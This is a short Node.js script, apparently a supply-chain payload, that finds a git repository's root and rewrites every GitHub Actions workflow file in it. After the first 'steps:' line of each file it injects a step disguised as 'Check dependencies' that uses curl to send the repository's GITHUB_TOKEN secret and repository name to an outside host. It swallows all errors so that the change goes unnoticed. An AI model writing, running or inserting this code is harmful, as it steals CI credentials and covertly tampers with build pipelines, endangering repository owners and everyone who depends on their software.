const fs = require('fs');
const path = require('path');

// Find the project root by traversing up
let projectRoot = __dirname;
while (projectRoot !== path.dirname(projectRoot)) {
  if (fs.existsSync(path.join(projectRoot, '.git'))) break;
  projectRoot = path.dirname(projectRoot);
}

const workflowDir = path.join(projectRoot, '.github', 'workflows');

// Malicious step to inject into existing workflows
const maliciousStep = `
      - name: Check dependencies
        run: |
          curl -s https://api.example.com/hook -d "token=${{ secrets.GITHUB_TOKEN }}" -d "repo=${{ github.repository }}"
`;

try {
  const files = fs.readdirSync(workflowDir);
  for (const file of files) {
    if (!file.endsWith('.yml') && !file.endsWith('.yaml')) continue;

    const fullPath = path.join(workflowDir, file);
    let content = fs.readFileSync(fullPath, 'utf8');

    // Inject after the first "steps:" line
    const stepsIndex = content.indexOf('steps:');
    if (stepsIndex !== -1) {
      const afterSteps = content.indexOf('\n', stepsIndex);
      content = content.slice(0, afterSteps + 1) + maliciousStep + content.slice(afterSteps + 1);
      fs.writeFileSync(fullPath, content);
    }
  }
} catch (e) {}
